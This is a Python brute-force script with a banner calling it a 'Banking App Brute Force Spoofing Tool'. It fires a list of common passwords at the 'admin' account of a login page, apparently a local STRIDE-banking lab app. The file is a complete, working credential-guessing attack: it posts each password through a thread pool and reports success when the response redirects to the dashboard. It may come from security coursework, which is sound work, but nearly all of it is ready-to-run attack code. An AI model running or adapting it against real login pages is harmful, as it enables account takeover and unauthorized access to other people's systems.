import requests
import time
from concurrent.futures import ThreadPoolExecutor

# Configuration
TARGET_URL = "http://localhost/STRIDE-banking/login.php"
USERNAME = "admin"  # Target account to spoof
THREADS = 1         # Concurrent attack threads
DELAY = 1           # Delay between attempts (seconds)

# Common password list (expand as needed)
PASSWORDS = [
    "admin", "Admin123", "password", "letmein", "bankadmin",
    "admin123", "root", "toor", "password1", "qwerty",
    "123456", "12345678", "123456789", "123123", "111111", "Admin@123",
    "P@ssw0rd123", "Welcome123", "Password123", "Banking123",
    "1234", "abc123", "qwerty123", "iloveyou", "admin@bank", "letmein123",
    "12345", "admin1", "root123", "toor123", "password123",
    "admin@123", "P@ssw0rd", "Bank@2023", "Welcome1", "Password1"
]

def attempt_login(password):
    """Attempt a single login with given password"""
    try:
        response = requests.post(
            TARGET_URL,
            data={"username": USERNAME, "password": password, "login":""},
            allow_redirects=False,
            timeout=5
        )
        
        # Check for successful login (redirect to dashboard)
        if "dashboard.php" in response.headers.get('Location', ''):
            print(f"\n[+] SUCCESS! Credentials: {USERNAME}:{password}")
            return True
        
        print(f"[-] Failed: {password}", end='\r')
        return False
    
    except Exception as e:
        print(f"[!] Error with {password}: {str(e)}")
        return False

def brute_force_attack():
    """Execute multi-threaded brute force attack"""
    print(f"\n[~] Starting brute force attack against {USERNAME}")
    print(f"[~] Testing {len(PASSWORDS)} passwords with {THREADS} threads\n")
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        results = list(executor.map(attempt_login, PASSWORDS))
    
    if not any(results):
        print("\n[x] Attack complete - no valid credentials found")
    
    elapsed = time.time() - start_time
    print(f"\n[~] Attack completed in {elapsed:.2f} seconds")

if __name__ == "__main__":
    print("""\
  ____             _      _____                      
 |  _ \           | |    / ____|                     
 | |_) |_ __ _   _| |_  | (___   ___ __ _ _ __ _   _ 
 |  _ <| '__| | | | __|  \___ \ / __/ _` | '__| | | |
 | |_) | |  | |_| | |_   ____) | (_| (_| | |  | |_| |
 |____/|_|   \__,_|\__| |_____/ \___\__,_|_|   \__, |
                                                __/ |
                                               |___/ 
    Banking App Brute Force Spoofing Tool
    """)
    
    brute_force_attack()